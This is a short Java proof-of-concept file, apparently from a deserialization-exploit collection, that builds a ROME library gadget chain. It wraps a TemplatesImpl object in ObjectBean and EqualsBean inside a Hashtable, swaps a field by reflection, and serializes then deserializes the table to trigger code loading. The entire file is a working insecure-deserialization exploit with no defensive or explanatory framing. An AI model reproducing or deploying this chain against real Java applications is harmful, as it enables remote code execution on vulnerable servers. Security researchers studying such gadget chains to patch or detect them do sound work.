package com.example.Rome;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;

import javax.xml.transform.Templates;
import java.util.Hashtable;

public class POC_3 {

    public static void main(String[] args) throws Exception {
        TemplatesImpl tmpl = Share.getTemplatesImplObj();

        ObjectBean delegate = new ObjectBean(Templates.class, tmpl);

        ObjectBean root = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "str"));

        Hashtable<Object, Object> table = new Hashtable<>();
        table.put(root, "value");

        ReflectionUtil.setField(root, "_equalsBean", new EqualsBean(ObjectBean.class, delegate));

        SerializeUtil.deserialize(SerializeUtil.serialize(table));
    }

}
